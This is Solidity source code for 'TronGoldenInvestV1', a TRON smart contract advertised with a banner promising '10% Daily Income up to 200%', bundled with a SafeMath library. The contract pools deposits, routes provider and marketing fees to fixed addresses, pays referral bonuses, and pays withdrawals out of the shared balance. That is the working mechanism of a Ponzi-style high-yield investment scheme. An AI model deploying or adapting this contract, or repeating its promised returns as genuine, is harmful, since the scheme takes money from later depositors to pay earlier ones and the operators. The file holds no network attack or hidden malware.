//SourceUnit: SafeMath.sol

pragma solidity ^0.5.10;

library SafeMath {

    /**
     * @dev Multiplies two numbers, reverts on overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-solidity/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b);

        return c;
    }

    /**
     * @dev Integer division of two numbers truncating the quotient, reverts on division by zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0); // Solidity only automatically asserts when dividing by 0
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    /**
     * @dev Subtracts two numbers, reverts on overflow (i.e. if subtrahend is greater than minuend).
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Adds two numbers, reverts on overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);

        return c;
    }

    /**
     * @dev Divides two numbers and returns the remainder (unsigned integer modulo),
     * reverts when dividing by zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0);
        return a % b;
    }

    function fxpMul(uint256 a, uint256 b, uint256 base) internal pure returns (uint256) {
        return div(mul(a, b), base);
    }
}

//SourceUnit: TronGoldenInvestV1.sol

/*

████████╗██████╗░░█████╗░███╗░░██╗  ░██████╗░░█████╗░██╗░░░░░██████╗░███████╗███╗░░██╗
╚══██╔══╝██╔══██╗██╔══██╗████╗░██║  ██╔════╝░██╔══██╗██║░░░░░██╔══██╗██╔════╝████╗░██║
░░░██║░░░██████╔╝██║░░██║██╔██╗██║  ██║░░██╗░██║░░██║██║░░░░░██║░░██║█████╗░░██╔██╗██║
░░░██║░░░██╔══██╗██║░░██║██║╚████║  ██║░░╚██╗██║░░██║██║░░░░░██║░░██║██╔══╝░░██║╚████║
░░░██║░░░██║░░██║╚█████╔╝██║░╚███║  ╚██████╔╝╚█████╔╝███████╗██████╔╝███████╗██║░╚███║
░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░╚═╝░░╚══╝  ░╚═════╝░░╚════╝░╚══════╝╚═════╝░╚══════╝╚═╝░░╚══╝

██╗███╗░░██╗██╗░░░██╗███████╗░██████╗████████╗
██║████╗░██║██║░░░██║██╔════╝██╔════╝╚══██╔══╝
██║██╔██╗██║╚██╗░██╔╝█████╗░░╚█████╗░░░░██║░░░
██║██║╚████║░╚████╔╝░██╔══╝░░░╚═══██╗░░░██║░░░
██║██║░╚███║░░╚██╔╝░░███████╗██████╔╝░░░██║░░░
╚═╝╚═╝░░╚══╝░░░╚═╝░░░╚══════╝╚═════╝░░░░╚═╝░░░

Get 10% Daily Income up to 200%!

contact us: trongold@trongoldeninvest.com
*/

pragma solidity ^0.5.10;
import "./SafeMath.sol";

contract TronGoldenInvestV1 {

  using SafeMath for uint256;

  uint256 constant public MIN_INVEST = 10 trx;
  uint256 constant public MAX_INVEST = 1000000 trx;
  uint256 constant public INCOME_PERCENT = 10;
  uint256 constant public MARKETING_FEE = 5;
  uint256 constant public PROVIDER_FEE = 4;
  uint256 constant public REFF_FEE = 5;
  uint256 constant public TIMESTEP = 1 days;
  uint256 constant public DIVIDER = 100;

  uint256 public totalInvestors;
  uint256 public totalInvested;
  uint256 public totalWithdrawn;
  uint256 public totalDeposits;

  address payable public marketingAddress;
  address payable public providerAddress;

  struct Deposit {
    uint256 amount;
    uint256 withdrawn;
    uint256 start;
    uint256 checkpoint;
  }

  struct User {
    Deposit[] deposits;
  
    address referrer;
    uint256 bonus;
    uint totalReff;
  }

  mapping (address => User) internal users;

  event DoInvest(address indexed user, uint256 amount);
  event Withdraw(address indexed user, uint256 amount);
  event WithdrawReff(address indexed user, uint256 amount);
  event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);

  constructor(address payable marketingAddr, address payable providerAddr) public {
    require(!isContract(marketingAddr) && !isContract(providerAddr));
    marketingAddress = marketingAddr;
    providerAddress = providerAddr;
  }

  function invest(address referrer) public payable {
    require(msg.value >= MIN_INVEST,"Min Invest 10");
    require(msg.value <= MAX_INVEST,"Max Invest 1000000");

    
    providerAddress.transfer(msg.value.mul(PROVIDER_FEE).div(DIVIDER));
    User storage user = users[msg.sender];
   

    if (user.referrer == address(0) && users[referrer].deposits.length > 0 && referrer != msg.sender) {
      user.referrer = referrer;
    }else{
      marketingAddress.transfer(msg.value.mul(MARKETING_FEE).div(DIVIDER));
      user.referrer = marketingAddress;
    }
    if (user.referrer != address(0)) {
      address upline = user.referrer;
      uint256 amount = msg.value.mul(REFF_FEE).div(DIVIDER);
      users[upline].bonus = users[upline].bonus.add(amount);
      users[upline].totalReff =    users[upline].totalReff.add(1); 
      emit RefBonus(upline, msg.sender, 0, amount);
    }
    if (user.deposits.length == 0) {
      totalInvestors = totalInvestors.add(1);
    }
    user.deposits.push(Deposit(msg.value, 0, block.timestamp,block.timestamp));
    totalInvested = totalInvested.add(msg.value);
    totalDeposits = totalDeposits.add(1);
    emit DoInvest(msg.sender, msg.value);

  }


  function withdraw(uint256 index) public {
    
    require(index>=0);
    
    User storage user = users[msg.sender];
    require(user.deposits.length > index ,"Index out of range exc");
    uint256 userPercentRate = getContractBalanceRate();
    uint256 totalAmount;
    uint256 dividends;
    uint256 maxIncome = (user.deposits[index].amount.mul(2));
    if (user.deposits[index].withdrawn < maxIncome) {
        if (user.deposits[index].start > user.deposits[index].checkpoint) {
          dividends = (user.deposits[index].amount.mul(userPercentRate).div(DIVIDER))
            .mul(block.timestamp.sub(user.deposits[index].start))
            .div(TIMESTEP);
        } else {
          dividends = (user.deposits[index].amount.mul(userPercentRate).div(DIVIDER))
            .mul(block.timestamp.sub(user.deposits[index].checkpoint))
            .div(TIMESTEP);
        }
        if (user.deposits[index].withdrawn.add(dividends) > maxIncome) {
          dividends = maxIncome.sub(user.deposits[index].withdrawn);
        }
        user.deposits[index].withdrawn = user.deposits[index].withdrawn.add(dividends);
        totalAmount = totalAmount.add(dividends);
     }
  
    uint256 contractBalance = address(this).balance;
  
    require(contractBalance > 0, "Pool is empty");
    if (contractBalance < totalAmount) {
      totalAmount = contractBalance;
    }

    user.deposits[index].checkpoint = block.timestamp;
    msg.sender.transfer(totalAmount);
    totalWithdrawn = totalWithdrawn.add(totalAmount);
    emit Withdraw(msg.sender, totalAmount);
  }


  function withdrawReff() public {
    User storage user = users[msg.sender];
    uint256 referralBonus = getUserReferralBonus(msg.sender);
    if (referralBonus > 0) {
      user.bonus = 0;
    }
    require(referralBonus > 0 , "No Reff");
    uint256 contractBalance = address(this).balance;
    require(contractBalance > 0, "Pool is empty");
    msg.sender.transfer(referralBonus);
    totalWithdrawn = totalWithdrawn.add(referralBonus);
    emit WithdrawReff(msg.sender, referralBonus);
  }
  function getContractBalance() public view returns (uint256) {
    return address(this).balance;
  }
  function getContractBalanceRate() public pure returns (uint256) {
    
    return INCOME_PERCENT;
  }

  function getUserDividends(address userAddress,uint256 index) public view returns (uint256) {
    User storage user = users[userAddress];
    uint256 userPercentRate = getContractBalanceRate();
    uint256 totalDividends;
    uint256 dividends;

    uint256 maxIncome = (user.deposits[index].amount.mul(2));
    if (user.deposits[index].withdrawn < maxIncome) {
      if (user.deposits[index].start > user.deposits[index].checkpoint) {
        dividends = (user.deposits[index].amount.mul(userPercentRate).div(DIVIDER))
          .mul(block.timestamp.sub(user.deposits[index].start))
          .div(TIMESTEP);
      } else {
        dividends = (user.deposits[index].amount.mul(userPercentRate).div(DIVIDER))
          .mul(block.timestamp.sub(user.deposits[index].checkpoint))
          .div(TIMESTEP);
      }
      if (user.deposits[index].withdrawn.add(dividends) >maxIncome) {
        dividends = maxIncome.sub(user.deposits[index].withdrawn);
      }
      totalDividends = totalDividends.add(dividends);
    }
    return totalDividends;
  }
  function getUserCheckpoint(address userAddress,uint256 index) public view returns(uint256) {
    return users[userAddress].deposits[index].checkpoint;
  }
  function getUserReferrer(address userAddress) public view returns(address) {
    return users[userAddress].referrer;
  }
  function getUserTotalReff(address userAddress) public view returns(uint256) {
    return users[userAddress].totalReff;
  }
  function getUserReferralBonus(address userAddress) public view returns(uint256) {
    return users[userAddress].bonus;
  }
  function getUserAvailable(address userAddress) public view returns(uint256) {
      uint256 total = 0;
      User storage user = users[userAddress];
      for (uint256 i = 0; i < user.deposits.length; i++) {
        total = total.add(getUserDividends(userAddress,i));
      }
    
    return getUserReferralBonus(userAddress).add(total);
  }
  function isActive(address userAddress) public view returns (bool) {
    User storage user = users[userAddress];
    if (user.deposits.length > 0) {
        
      if (user.deposits[user.deposits.length-1].withdrawn < ((user.deposits[user.deposits.length-1].amount.mul(2)).add(user.deposits[user.deposits.length-1].amount.div(2)))) {
        return true;
      }
    }
  }
  function getUserDepositInfo(address userAddress, uint256 index) public view returns(uint256, uint256, uint256,uint256) {
      User storage user = users[userAddress];
    return (user.deposits[index].amount, user.deposits[index].withdrawn, user.deposits[index].start,getUserDividends(userAddress,index));
  }
  function getUserAmountOfDeposits(address userAddress) public view returns(uint256) {
    return users[userAddress].deposits.length;
  }
  function getUserTotalDeposits(address userAddress) public view returns(uint256) {
      User storage user = users[userAddress];
    uint256 amount;
    for (uint256 i = 0; i < user.deposits.length; i++) {
      amount = amount.add(user.deposits[i].amount);
    }
    return amount;
  }
  function getUserTotalWithdrawn(address userAddress) public view returns(uint256) {
      User storage user = users[userAddress];
    uint256 amount;
    for (uint256 i = 0; i < user.deposits.length; i++) {
      amount = amount.add(user.deposits[i].withdrawn);
    }
    return amount;
  }
  function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

}